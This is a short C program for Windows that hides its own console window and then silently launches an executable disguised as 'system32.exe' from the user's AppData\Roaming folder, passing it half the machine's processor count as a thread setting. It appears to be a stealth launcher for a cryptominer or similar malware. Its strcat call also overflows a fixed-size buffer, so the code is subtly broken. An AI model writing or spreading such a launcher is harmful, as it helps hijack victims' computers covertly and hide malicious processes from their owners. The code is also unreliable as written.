#include <stdio.h>
#include <string.h>
#include<unistd.h>
#include <windows.h>



int main(){
	
    //hide Window

    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    

    
    char buffer [1024] = "echo \%number_of_processors\%"; 
    FILE *fp;
    fp = _popen("echo \%number_of_processors\%", "r");
    char container[1024];
    fgets(container, 1024, fp);
    int nbThreads = atoi(container);
    nbThreads/=2;
    char nbThrds[1024];
    sprintf(nbThrds, "%i", nbThreads);
    char cmd[] = "\%userprofile\%\\Appdata\\roaming\\WIN32\\system32.exe --threads=";
    strcat(cmd, nbThrds);
    system(cmd);
    return 0;
}

